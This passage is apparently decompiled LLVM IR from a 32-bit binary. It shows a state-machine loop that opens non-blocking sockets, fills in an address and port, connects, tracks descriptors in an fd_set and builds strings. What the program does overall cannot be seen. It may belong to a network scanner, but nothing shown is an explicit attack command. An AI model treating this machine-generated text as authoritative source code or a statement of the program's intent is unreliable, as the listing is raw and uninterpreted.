  store i1 %v6_804851f, i1* %zf.global-to-local, align 1
  store i32 %v1_804851f, i32* @esi, align 4
  %v1_8048525 = add i32 %v0_804850c, 116
  %v2_8048525 = inttoptr i32 %v1_8048525 to i32*
  store i32 0, i32* %v2_8048525, align 4
  %v0_804852d = load i32, i32* @esp, align 4
  %v1_804852d = add i32 %v0_804852d, 72
  %v2_804852d = inttoptr i32 %v1_804852d to i32*
  store i32 0, i32* %v2_804852d, align 4
  br label %dec_label_pc_80485a5

dec_label_pc_8048537:                             ; preds = %dec_label_pc_80485b6
  %v10_8048537 = icmp eq i8 %v3_80485a5, 2
  store i1 %v10_8048537, i1* %zf.global-to-local, align 1
  br i1 %v10_8048537, label %dec_label_pc_8048c9d, label %dec_label_pc_804853f

dec_label_pc_804853f:                             ; preds = %dec_label_pc_8048537
  %v10_804853f = icmp eq i8 %v3_80485a5, 4
  store i1 %v10_804853f, i1* %zf.global-to-local, align 1
  br i1 %v10_804853f, label %dec_label_pc_8048700, label %dec_label_pc_8048547

dec_label_pc_8048547:                             ; preds = %dec_label_pc_804853f
  %v10_8048547 = icmp eq i8 %v3_80485a5, 6
  store i1 %v10_8048547, i1* %zf.global-to-local, align 1
  br i1 %v10_8048547, label %dec_label_pc_80493a7, label %dec_label_pc_804854f

dec_label_pc_804854f:                             ; preds = %dec_label_pc_8048547
  %v10_804854f = icmp eq i8 %v3_80485a5, 7
  store i1 %v10_804854f, i1* %zf.global-to-local, align 1
  br i1 %v10_804854f, label %dec_label_pc_8049773, label %dec_label_pc_8048557

dec_label_pc_8048557:                             ; preds = %dec_label_pc_804854f
  %v10_8048557 = icmp eq i8 %v3_80485a5, 10
  store i1 %v10_8048557, i1* %zf.global-to-local, align 1
  br i1 %v10_8048557, label %dec_label_pc_8049829, label %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge

dec_label_pc_8048557.dec_label_pc_804855f_crit_edge: ; preds = %dec_label_pc_8048557
  %v0_804855f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804855f

dec_label_pc_804855f:                             ; preds = %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge, %dec_label_pc_8048c9d
  %v0_804855f = phi i32 [ %v0_804855f.pre, %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge ], [ %v0_8048c9d, %dec_label_pc_8048c9d ]
  %v9_804855f = icmp eq i32 %v0_804855f, 12
  store i1 %v9_804855f, i1* %zf.global-to-local, align 1
  %v1_8048562 = add i32 %v0_80485a5, -1440
  %v2_8048562 = inttoptr i32 %v1_8048562 to i32*
  %v3_8048562 = load i32, i32* %v2_8048562, align 4
  store i32 %v3_8048562, i32* %edx.global-to-local, align 4
  store i8 0, i8* %v2_80485a5, align 1
  %v0_804856f = load i32, i32* %edx.global-to-local, align 4
  %v1_804856f = load i32, i32* @esp, align 4
  %v2_804856f = add i32 %v1_804856f, -4
  %v3_804856f = inttoptr i32 %v2_804856f to i32*
  store i32 %v0_804856f, i32* %v3_804856f, align 4
  %v1_8048570 = call i32 @function_8052191(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048570, i32* %eax.global-to-local, align 4
  %v0_8048575 = load i32, i32* @esi, align 4
  %v1_8048575 = add i32 %v0_8048575, -1440
  %v2_8048575 = inttoptr i32 %v1_8048575 to i32*
  store i32 -1, i32* %v2_8048575, align 4
  %v0_804857f = load i32, i32* @esp, align 4
  %v6_804857f = icmp eq i32 %v0_804857f, -16
  store i1 %v6_804857f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048582

dec_label_pc_8048582:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_8048601, %dec_label_pc_804861f, %dec_label_pc_80486e4, %dec_label_pc_804855f
  %v0_8048582 = load i32, i32* @esp, align 4
  %v1_8048582 = add i32 %v0_8048582, 100
  %v2_8048582 = inttoptr i32 %v1_8048582 to i32*
  %v3_8048582 = load i32, i32* %v2_8048582, align 4
  %v0_8048586 = load i32, i32* @ebp, align 4
  %v1_8048586 = add i32 %v0_8048586, 3140
  store i32 %v1_8048586, i32* @ebp, align 4
  %v1_804858c = add i32 %v3_8048582, 1
  store i32 %v1_804858c, i32* %eax.global-to-local, align 4
  %v0_804858d = load i32, i32* @esi, align 4
  %v1_804858d = add i32 %v0_804858d, 3140
  store i32 %v1_804858d, i32* @esi, align 4
  store i32 %v1_804858c, i32* %v2_8048582, align 4
  %v0_8048597 = load i32, i32* @esp, align 4
  %v1_8048597 = add i32 %v0_8048597, 100
  %v2_8048597 = inttoptr i32 %v1_8048597 to i32*
  %v3_8048597 = load i32, i32* %v2_8048597, align 4
  store i32 %v3_8048597, i32* @ecx, align 4
  %v1_804859b = add i32 %v0_8048597, 112
  %v2_804859b = inttoptr i32 %v1_804859b to i32*
  %v3_804859b = load i32, i32* %v2_804859b, align 4
  %v15_804859b = icmp eq i32 %v3_804859b, %v3_8048597
  store i1 %v15_804859b, i1* %zf.global-to-local, align 1
  br i1 %v15_804859b, label %dec_label_pc_8048cdd, label %dec_label_pc_80485a5

dec_label_pc_80485a5:                             ; preds = %dec_label_pc_8048582, %dec_label_pc_8048517
  %v0_80485a5 = load i32, i32* @esi, align 4
  %v1_80485a5 = add i32 %v0_80485a5, -1436
  %v2_80485a5 = inttoptr i32 %v1_80485a5 to i8*
  %v3_80485a5 = load i8, i8* %v2_80485a5, align 1
  %v4_80485a5 = zext i8 %v3_80485a5 to i32
  %v5_80485a5 = load i32, i32* %eax.global-to-local, align 4
  %v6_80485a5 = and i32 %v5_80485a5, -256
  %v7_80485a5 = or i32 %v6_80485a5, %v4_80485a5
  store i32 %v7_80485a5, i32* %eax.global-to-local, align 4
  %v0_80485ab = load i32, i32* @ebp, align 4
  %v1_80485ab = add i32 %v0_80485ab, -16
  store i32 %v1_80485ab, i32* @edi, align 4
  %v6_80485ae = icmp eq i8 %v3_80485a5, 0
  %v10_80485ae = icmp eq i8 %v3_80485a5, 1
  store i1 %v10_80485ae, i1* %zf.global-to-local, align 1
  br i1 %v10_80485ae, label %dec_label_pc_80486ee, label %dec_label_pc_80485b6

dec_label_pc_80485b6:                             ; preds = %dec_label_pc_80485a5
  store i1 %v6_80485ae, i1* %zf.global-to-local, align 1
  %v1_80485b8 = icmp eq i1 %v6_80485ae, false
  br i1 %v1_80485b8, label %dec_label_pc_8048537, label %dec_label_pc_80485be

dec_label_pc_80485be:                             ; preds = %dec_label_pc_80485b6, %dec_label_pc_8048c91
  %v0_80485be = load i32, i32* @esp, align 4
  %v1_80485be = add i32 %v0_80485be, 20868
  %v2_80485be = inttoptr i32 %v1_80485be to i32*
  store i32 0, i32* %v2_80485be, align 4
  %v0_80485c9 = load i32, i32* @esp, align 4
  %v1_80485c9 = add i32 %v0_80485c9, 20872
  %v2_80485c9 = inttoptr i32 %v1_80485c9 to i32*
  store i32 0, i32* %v2_80485c9, align 4
  %v0_80485d4 = load i32, i32* @esp, align 4
  %v1_80485d4 = add i32 %v0_80485d4, 20876
  %v2_80485d4 = inttoptr i32 %v1_80485d4 to i32*
  store i32 0, i32* %v2_80485d4, align 4
  %v0_80485df = load i32, i32* @esp, align 4
  %v1_80485df = add i32 %v0_80485df, 20880
  %v2_80485df = inttoptr i32 %v1_80485df to i32*
  store i32 0, i32* %v2_80485df, align 4
  %v0_80485ea = load i32, i32* @esi, align 4
  %v1_80485ea = add i32 %v0_80485ea, -1440
  %v2_80485ea = inttoptr i32 %v1_80485ea to i32*
  %v3_80485ea = load i32, i32* %v2_80485ea, align 4
  store i32 %v3_80485ea, i32* %eax.global-to-local, align 4
  %v10_80485f0 = icmp eq i32 %v3_80485ea, -1
  store i1 %v10_80485f0, i1* %zf.global-to-local, align 1
  %v1_8048601.pre = load i32, i32* @esp, align 4
  br i1 %v10_80485f0, label %dec_label_pc_8048601, label %dec_label_pc_80485f5

dec_label_pc_80485f5:                             ; preds = %dec_label_pc_80485be
  %v9_80485f5 = icmp eq i32 %v1_8048601.pre, 12
  store i1 %v9_80485f5, i1* %zf.global-to-local, align 1
  %v2_80485f8 = add i32 %v1_8048601.pre, -16
  %v3_80485f8 = inttoptr i32 %v2_80485f8 to i32*
  store i32 %v3_80485ea, i32* %v3_80485f8, align 4
  %v1_80485f9 = call i32 @function_8052191(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80485f9, i32* %eax.global-to-local, align 4
  %v0_80485fe = load i32, i32* @esp, align 4
  %v1_80485fe = add i32 %v0_80485fe, 16
  %v6_80485fe = icmp eq i32 %v1_80485fe, 0
  store i1 %v6_80485fe, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048601

dec_label_pc_8048601:                             ; preds = %dec_label_pc_80485be, %dec_label_pc_80485f5
  %v1_8048601 = phi i32 [ %v1_80485fe, %dec_label_pc_80485f5 ], [ %v1_8048601.pre, %dec_label_pc_80485be ]
  %v0_8048601 = load i32, i32* @ecx, align 4
  %v2_8048601 = add i32 %v1_8048601, -4
  %v3_8048601 = inttoptr i32 %v2_8048601 to i32*
  store i32 %v0_8048601, i32* %v3_8048601, align 4
  %v1_8048602 = add i32 %v1_8048601, -8
  %v2_8048602 = inttoptr i32 %v1_8048602 to i32*
  store i32 0, i32* %v2_8048602, align 4
  %v1_8048604 = add i32 %v1_8048601, -12
  %v2_8048604 = inttoptr i32 %v1_8048604 to i32*
  store i32 1, i32* %v2_8048604, align 4
  %v1_8048606 = add i32 %v1_8048601, -16
  %v2_8048606 = inttoptr i32 %v1_8048606 to i32*
  store i32 2, i32* %v2_8048606, align 4
  %v3_8048608 = call i32 @function_8052985(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048608, i32* %eax.global-to-local, align 4
  %v1_8048610 = load i32, i32* @esi, align 4
  %v2_8048610 = add i32 %v1_8048610, -1440
  %v3_8048610 = inttoptr i32 %v2_8048610 to i32*
  store i32 %v3_8048608, i32* %v3_8048610, align 4
  %v10_8048616 = icmp eq i32 %v3_8048608, -1
  store i1 %v10_8048616, i1* %zf.global-to-local, align 1
  br i1 %v10_8048616, label %dec_label_pc_8048582, label %dec_label_pc_804861f

dec_label_pc_804861f:                             ; preds = %dec_label_pc_8048601
  %v0_804861f = load i32, i32* @edx, align 4
  %v1_804861f = load i32, i32* @esp, align 4
  %v2_804861f = add i32 %v1_804861f, -4
  %v3_804861f = inttoptr i32 %v2_804861f to i32*
  store i32 %v0_804861f, i32* %v3_804861f, align 4
  %v1_8048620 = add i32 %v1_804861f, -8
  %v2_8048620 = inttoptr i32 %v1_8048620 to i32*
  store i32 0, i32* %v2_8048620, align 4
  %v1_8048622 = add i32 %v1_804861f, -12
  %v2_8048622 = inttoptr i32 %v1_8048622 to i32*
  store i32 3, i32* %v2_8048622, align 4
  %v2_8048624 = add i32 %v1_804861f, -16
  %v3_8048624 = inttoptr i32 %v2_8048624 to i32*
  store i32 %v3_8048608, i32* %v3_8048624, align 4
  %v3_8048625 = call i32 @function_80520cd(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804862a = load i32, i32* @esp, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_804862d = or i32 %v3_8048625, 2048
  store i32 %v12_804862d, i32* %eax.global-to-local, align 4
  %v2_8048630 = add i32 %v0_804862a, 8
  %v3_8048630 = inttoptr i32 %v2_8048630 to i32*
  store i32 %v12_804862d, i32* %v3_8048630, align 4
  %v1_8048631 = add i32 %v0_804862a, 4
  %v2_8048631 = inttoptr i32 %v1_8048631 to i32*
  store i32 4, i32* %v2_8048631, align 4
  %v0_8048633 = load i32, i32* @esi, align 4
  %v1_8048633 = add i32 %v0_8048633, -1440
  %v2_8048633 = inttoptr i32 %v1_8048633 to i32*
  %v3_8048633 = load i32, i32* %v2_8048633, align 4
  store i32 %v3_8048633, i32* %eax.global-to-local, align 4
  %v3_8048639 = inttoptr i32 %v0_804862a to i32*
  store i32 %v3_8048633, i32* %v3_8048639, align 4
  %v3_804863a = call i32 @function_80520cd(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804863f = load i32, i32* @esp, align 4
  %v1_804863f = add i32 %v0_804863f, 20916
  store i32 %v1_804863f, i32* %eax.global-to-local, align 4
  %v2_8048646 = inttoptr i32 %v1_804863f to i32*
  store i32 65535, i32* %v2_8048646, align 4
  %v0_8048651 = load i32, i32* @esp, align 4
  %v1_8048651 = inttoptr i32 %v0_8048651 to i32*
  store i32 4, i32* %v1_8048651, align 4
  %v0_8048658 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048658 = load i32, i32* @esp, align 4
  %v2_8048658 = add i32 %v1_8048658, -4
  %v3_8048658 = inttoptr i32 %v2_8048658 to i32*
  store i32 %v0_8048658, i32* %v3_8048658, align 4
  %v1_8048659 = add i32 %v1_8048658, -8
  %v2_8048659 = inttoptr i32 %v1_8048659 to i32*
  store i32 8, i32* %v2_8048659, align 4
  %v1_804865b = add i32 %v1_8048658, -12
  %v2_804865b = inttoptr i32 %v1_804865b to i32*
  store i32 0, i32* %v2_804865b, align 4
  %v0_804865d = load i32, i32* @esi, align 4
  %v1_804865d = add i32 %v0_804865d, -1440
  %v2_804865d = inttoptr i32 %v1_804865d to i32*
  %v3_804865d = load i32, i32* %v2_804865d, align 4
  store i32 %v3_804865d, i32* %eax.global-to-local, align 4
  %v2_8048663 = add i32 %v1_8048658, -16
  %v3_8048663 = inttoptr i32 %v2_8048663 to i32*
  store i32 %v3_804865d, i32* %v3_8048663, align 4
  %v5_8048664 = call i32 @function_805294a(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8048664, i32* %eax.global-to-local, align 4
  %v0_8048669 = load i32, i32* @esi, align 4
  %v1_8048669 = add i32 %v0_8048669, -1424
  %v2_8048669 = inttoptr i32 %v1_8048669 to i32*
  %v3_8048669 = load i32, i32* %v2_8048669, align 4
  store i32 %v3_8048669, i32* %eax.global-to-local, align 4
  %v0_804866f = load i32, i32* @esp, align 4
  %v1_804866f = add i32 %v0_804866f, 112
  %v2_804866f = inttoptr i32 %v1_804866f to i32*
  %v3_804866f = load i32, i32* %v2_804866f, align 4
  store i32 %v3_804866f, i32* %edx.global-to-local, align 4
  %v2_8048673 = add i32 %v0_804866f, 20904
  %v3_8048673 = inttoptr i32 %v2_8048673 to i32*
  store i32 %v3_8048669, i32* %v3_8048673, align 4
  %v0_804867a = load i32, i32* @esp, align 4
  %v1_804867a = add i32 %v0_804867a, 20900
  %v2_804867a = inttoptr i32 %v1_804867a to i16*
  store i16 2, i16* %v2_804867a, align 2
  %v0_8048684 = load i32, i32* @esp, align 4
  %v1_8048684 = add i32 %v0_8048684, 102
  %v2_8048684 = inttoptr i32 %v1_8048684 to i16*
  %v3_8048684 = load i16, i16* %v2_8048684, align 2
  %v5_8048684 = load i32, i32* %eax.global-to-local, align 4
  %v6_8048684 = and i32 %v5_8048684, -65536
  %v0_8048689 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048689 = load i32, i32* @esi, align 4
  %v2_8048689 = add i32 %v1_8048689, -1432
  %v3_8048689 = inttoptr i32 %v2_8048689 to i32*
  store i32 %v0_8048689, i32* %v3_8048689, align 4
  %v2_804868f = call i16 @llvm.bswap.i16(i16 %v3_8048684)
  %v3_804868f = zext i16 %v2_804868f to i32
  %v6_804868f = or i32 %v3_804868f, %v6_8048684
  store i32 %v6_804868f, i32* %eax.global-to-local, align 4
  %v2_8048693 = load i32, i32* @esp, align 4
  %v3_8048693 = add i32 %v2_8048693, 20902
  %v4_8048693 = inttoptr i32 %v3_8048693 to i16*
  store i16 %v2_804868f, i16* %v4_8048693, align 2
  %v0_804869b = load i32, i32* @esp, align 4
  %v9_804869b = icmp eq i32 %v0_804869b, -28
  store i1 %v9_804869b, i1* %zf.global-to-local, align 1
  %v0_804869e = load i32, i32* @esi, align 4
  %v1_804869e = add i32 %v0_804869e, -1436
  %v2_804869e = inttoptr i32 %v1_804869e to i8*
  store i8 2, i8* %v2_804869e, align 1
  %v0_80486a5 = load i32, i32* @esp, align 4
  %v1_80486a5 = add i32 %v0_80486a5, -4
  %v2_80486a5 = inttoptr i32 %v1_80486a5 to i32*
  store i32 16, i32* %v2_80486a5, align 4
  %v1_80486a7 = add i32 %v0_80486a5, 20872
  store i32 %v1_80486a7, i32* %ecx.global-to-local, align 4
  %v2_80486ae = add i32 %v0_80486a5, -8
  %v3_80486ae = inttoptr i32 %v2_80486ae to i32*
  store i32 %v1_80486a7, i32* %v3_80486ae, align 4
  %v0_80486af = load i32, i32* @esi, align 4
  %v1_80486af = add i32 %v0_80486af, -1440
  %v2_80486af = inttoptr i32 %v1_80486af to i32*
  %v3_80486af = load i32, i32* %v2_80486af, align 4
  store i32 %v3_80486af, i32* @edi, align 4
  %v2_80486b5 = add i32 %v0_80486a5, -12
  %v3_80486b5 = inttoptr i32 %v2_80486b5 to i32*
  store i32 %v3_80486af, i32* %v3_80486b5, align 4
  %v3_80486b6 = call i32 @function_80527aa(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esi, align 4
  %v1_80486bb = add i32 %v0_80486bb, -1440
  %v2_80486bb = inttoptr i32 %v1_80486bb to i32*
  %v3_80486bb = load i32, i32* %v2_80486bb, align 4
  %v1_80486c3 = urem i32 %v3_80486bb, 32
  store i32 %v1_80486c3, i32* %eax.global-to-local, align 4
  %v2_80486c6 = udiv i32 %v3_80486bb, 32
  store i32 %v2_80486c6, i32* %edx.global-to-local, align 4
  %v0_80486c9 = load i32, i32* @esp, align 4
  %v2_80486c9 = mul nuw nsw i32 %v2_80486c6, 4
  %v3_80486c9 = add nuw nsw i32 %v2_80486c9, 20628
  %v4_80486c9 = add i32 %v3_80486c9, %v0_80486c9
  %v5_80486c9 = inttoptr i32 %v4_80486c9 to i32*
  %v6_80486c9 = load i32, i32* %v5_80486c9, align 4
  %v9_80486c9 = shl i32 1, %v1_80486c3
  %v12_80486c9 = or i32 %v6_80486c9, %v9_80486c9
  store i32 %v12_80486c9, i32* %v5_80486c9, align 4
  %v0_80486d1 = load i32, i32* @esp, align 4
  %v1_80486d1 = add i32 %v0_80486d1, 16
  %v0_80486d4 = load i32, i32* @esi, align 4
  %v1_80486d4 = add i32 %v0_80486d4, -1440
  %v2_80486d4 = inttoptr i32 %v1_80486d4 to i32*
  %v3_80486d4 = load i32, i32* %v2_80486d4, align 4
  store i32 %v3_80486d4, i32* %eax.global-to-local, align 4
  %v1_80486da = add i32 %v0_80486d1, 88
  %v2_80486da = inttoptr i32 %v1_80486da to i32*
  %v3_80486da = load i32, i32* %v2_80486da, align 4
  %v5_80486da = sub i32 %v3_80486da, %v3_80486d4
  %v11_80486da = xor i32 %v3_80486da, %v3_80486d4
  %v12_80486da = xor i32 %v5_80486da, %v3_80486da
  %v13_80486da = and i32 %v12_80486da, %v11_80486da
  %v14_80486da = icmp slt i32 %v13_80486da, 0
  %v15_80486da = icmp eq i32 %v5_80486da, 0
  store i1 %v15_80486da, i1* %zf.global-to-local, align 1
  %v16_80486da = icmp slt i32 %v5_80486da, 0
  %v2_80486de = icmp eq i1 %v16_80486da, %v14_80486da
  br i1 %v2_80486de, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80486e4:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_804861f
  %v1_80486e5 = phi i32 [ %v1_8049845, %dec_label_pc_8049829 ], [ %v1_804978f, %dec_label_pc_8049773 ], [ %v1_80493c3, %dec_label_pc_80493a7 ], [ %v0_8048cce, %dec_label_pc_8048cb2 ], [ %v1_8048c79, %dec_label_pc_8048c28 ], [ %v1_80486d1, %dec_label_pc_804861f ]
  %v0_80486e4 = phi i32 [ %v3_804983f, %dec_label_pc_8049829 ], [ %v3_8049789, %dec_label_pc_8049773 ], [ %v3_80493bd, %dec_label_pc_80493a7 ], [ %v3_8048cc8, %dec_label_pc_8048cb2 ], [ %v3_8048c7c, %dec_label_pc_8048c28 ], [ %v3_80486d4, %dec_label_pc_804861f ]
  %v1_80486e4 = add i32 %v0_80486e4, 1
  %v8_80486e4 = icmp eq i32 %v1_80486e4, 0
  store i1 %v8_80486e4, i1* %zf.global-to-local, align 1
  store i32 %v1_80486e4, i32* %eax.global-to-local, align 4
  %v2_80486e5 = add i32 %v1_80486e5, 72
  %v3_80486e5 = inttoptr i32 %v2_80486e5 to i32*
  store i32 %v1_80486e4, i32* %v3_80486e5, align 4
  br label %dec_label_pc_8048582

dec_label_pc_80486ee:                             ; preds = %dec_label_pc_80485a5
  %v1_80486ee = add i32 %v0_80485a5, 16
  %v2_80486ee = inttoptr i32 %v1_80486ee to i32*
  %v3_80486ee = load i32, i32* %v2_80486ee, align 4
  store i32 %v3_80486ee, i32* @ebx, align 4
  %v1_80486f1 = icmp eq i32 %v3_80486ee, 0
  store i1 %v1_80486f1, i1* %zf.global-to-local, align 1
  br i1 %v1_80486f1, label %dec_label_pc_8048c91, label %dec_label_pc_80486f9

dec_label_pc_80486f9:                             ; preds = %dec_label_pc_80486ee
  store i8 4, i8* %v2_80485a5, align 1
  %v0_8048700.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8048700

dec_label_pc_8048700:                             ; preds = %dec_label_pc_804853f, %dec_label_pc_80486f9
  %v0_8048700 = phi i32 [ %v0_80485a5, %dec_label_pc_804853f ], [ %v0_8048700.pre, %dec_label_pc_80486f9 ]
  %v1_8048700 = add i32 %v0_8048700, 24
  %v2_8048700 = inttoptr i32 %v1_8048700 to i32*
  store i32 -1, i32* %v2_8048700, align 4
  %v0_8048707 = load i32, i32* @esi, align 4
  %v1_8048707 = add i32 %v0_8048707, 12
  %v2_8048707 = inttoptr i32 %v1_8048707 to i32*
  store i32 0, i32* %v2_8048707, align 4
  %v0_804870e = load i32, i32* @edi, align 4
  %v1_804870e = add i32 %v0_804870e, 2116
  store i32 %v1_804870e, i32* @eax, align 4
  %v0_8048714 = load i32, i32* @ecx, align 4
  %v1_8048714 = load i32, i32* @esp, align 4
  %v2_8048714 = add i32 %v1_8048714, -4
  %v3_8048714 = inttoptr i32 %v2_8048714 to i32*
  store i32 %v0_8048714, i32* %v3_8048714, align 4
  %v0_8048715 = load i32, i32* @ecx, align 4
  %v2_8048715 = add i32 %v1_8048714, -8
  %v3_8048715 = inttoptr i32 %v2_8048715 to i32*
  store i32 %v0_8048715, i32* %v3_8048715, align 4
  %v1_8048716 = add i32 %v1_8048714, -12
  %v2_8048716 = inttoptr i32 %v1_8048716 to i32*
  store i32 1024, i32* %v2_8048716, align 4
  %v0_804871b = load i32, i32* @eax, align 4
  %v2_804871b = add i32 %v1_8048714, -16
  %v3_804871b = inttoptr i32 %v2_804871b to i32*
  store i32 %v0_804871b, i32* %v3_804871b, align 4
  %v2_804871c = call i32 @function_8051c80(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804871c, i32* %eax.global-to-local, align 4
  %v0_8048721 = load i32, i32* @esi, align 4
  %v1_8048721 = add i32 %v0_8048721, 672
  %v2_8048721 = inttoptr i32 %v1_8048721 to i32*
  store i32 0, i32* %v2_8048721, align 4
  %v0_804872b = load i32, i32* @esp, align 4
  %v1_804872b = inttoptr i32 %v0_804872b to i32*
  %v2_804872b = load i32, i32* %v1_804872b, align 4
  store i32 %v2_804872b, i32* %eax.global-to-local, align 4
  %v3_804872b = add i32 %v0_804872b, 4
  %v1_804872c = inttoptr i32 %v3_804872b to i32*
  %v2_804872c = load i32, i32* %v1_804872c, align 4
  store i32 %v2_804872c, i32* %edx.global-to-local, align 4
  store i32 10240, i32* %v1_804872c, align 4
  %v1_8048732 = add i32 %v0_804872b, 10388
  store i32 %v1_8048732, i32* @eax, align 4
  store i32 %v1_8048732, i32* %v1_804872b, align 4
  %v2_804873a = call i32 @function_8051c80(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804873a, i32* %eax.global-to-local, align 4
  %v0_804873f = load i32, i32* @edi, align 4
  %v1_804873f = add i32 %v0_804873f, 1431
  store i32 %v1_804873f, i32* %edx.global-to-local, align 4
  %v1_8048745 = load i32, i32* @esp, align 4
  %v2_8048745 = add i32 %v1_8048745, 112
  %v3_8048745 = inttoptr i32 %v2_8048745 to i32*
  store i32 %v1_804873f, i32* %v3_8048745, align 4
  %v0_8048749 = load i32, i32* @esp, align 4
  %v1_8048749 = inttoptr i32 %v0_8048749 to i32*
  %v2_8048749 = load i32, i32* %v1_8048749, align 4
  store i32 %v2_8048749, i32* %eax.global-to-local, align 4
  %v1_804874a = add i32 %v0_8048749, 10388
  store i32 %v1_804874a, i32* %ecx.global-to-local, align 4
  store i32 %v1_804874a, i32* %v1_8048749, align 4
  %v2_8048752 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048752, i32* %eax.global-to-local, align 4
  %v0_8048757 = load i32, i32* @esp, align 4
  %v1_8048757 = inttoptr i32 %v0_8048757 to i32*
  %v2_8048757 = load i32, i32* %v1_8048757, align 4
  store i32 %v2_8048757, i32* %ecx.global-to-local, align 4
  %v3_8048757 = add i32 %v0_8048757, 4
  %v1_8048758 = inttoptr i32 %v3_8048757 to i32*
  %v2_8048758 = load i32, i32* %v1_8048758, align 4
  store i32 %v2_8048758, i32* @ebx, align 4
  %v1_8048759 = add i32 %v0_8048757, 112
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  %v3_8048759 = load i32, i32* %v2_8048759, align 4
  store i32 %v3_8048759, i32* %v1_8048758, align 4
  %v1_804875e = add i32 %v0_8048757, 10388
  store i32 %v1_804875e, i32* %edx.global-to-local, align 4
  %v2_8048765 = add i32 %v1_804875e, %v2_8048752
  store i32 %v2_8048765, i32* %eax.global-to-local, align 4
  store i32 %v2_8048765, i32* %v1_8048757, align 4
  %v3_8048769 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048769, i32* %eax.global-to-local, align 4
  %v0_804876e = load i32, i32* @esp, align 4
  %v1_804876e = inttoptr i32 %v0_804876e to i32*
  %v2_804876e = load i32, i32* %v1_804876e, align 4
  store i32 %v2_804876e, i32* @ebx, align 4
  %v1_804876f = add i32 %v0_804876e, 10388
  store i32 %v1_804876f, i32* %ecx.global-to-local, align 4
  store i32 %v1_804876f, i32* %v1_804876e, align 4
  %v2_8048777 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048777, i32* %eax.global-to-local, align 4
  %v0_804877c = load i32, i32* @esp, align 4
  %v1_804877c = inttoptr i32 %v0_804877c to i32*
  %v2_804877c = load i32, i32* %v1_804877c, align 4
  store i32 %v2_804877c, i32* %edx.global-to-local, align 4
  %v3_804877c = add i32 %v0_804877c, 4
  %v1_804877d = inttoptr i32 %v3_804877c to i32*
  %v2_804877d = load i32, i32* %v1_804877d, align 4
  store i32 %v2_804877d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8054abf.7 to i32), i32* %v1_804877d, align 4
  %v1_8048783 = add i32 %v0_804877c, 10388
  store i32 %v1_8048783, i32* %edx.global-to-local, align 4
  %v2_804878a = add i32 %v1_8048783, %v2_8048777
  store i32 %v2_804878a, i32* %eax.global-to-local, align 4
  store i32 %v2_804878a, i32* %v1_804877c, align 4
  %v3_804878e = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804878e, i32* %eax.global-to-local, align 4
  %v0_8048793 = load i32, i32* @esp, align 4
  %v1_8048793 = inttoptr i32 %v0_8048793 to i32*
  %v2_8048793 = load i32, i32* %v1_8048793, align 4
  store i32 %v2_8048793, i32* @ebx, align 4
  %v1_8048794 = add i32 %v0_8048793, 10388
  store i32 %v1_8048794, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048794, i32* %v1_8048793, align 4
  %v2_804879c = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_804879c, i32* %eax.global-to-local, align 4
  %v0_80487a1 = load i32, i32* @esp, align 4
  %v1_80487a1 = inttoptr i32 %v0_80487a1 to i32*
  %v3_80487a1 = add i32 %v0_80487a1, 4
  %v0_80487a2 = load i32, i32* @edi, align 4
  %v1_80487a2 = add i32 %v0_80487a2, 532
  store i32 %v1_80487a2, i32* %edx.global-to-local, align 4
  %v1_80487a8 = inttoptr i32 %v3_80487a1 to i32*
  %v2_80487a8 = load i32, i32* %v1_80487a8, align 4
  store i32 %v2_80487a8, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487a2, i32* %v1_80487a8, align 4
  %v1_80487aa = add i32 %v0_80487a1, 10388
  store i32 %v1_80487aa, i32* %edx.global-to-local, align 4
  %v2_80487b1 = add i32 %v1_80487aa, %v2_804879c
  store i32 %v2_80487b1, i32* %eax.global-to-local, align 4
  store i32 %v2_80487b1, i32* %v1_80487a1, align 4
  %v3_80487b5 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487b5, i32* %eax.global-to-local, align 4
  %v0_80487ba = load i32, i32* @esp, align 4
  %v1_80487ba = inttoptr i32 %v0_80487ba to i32*
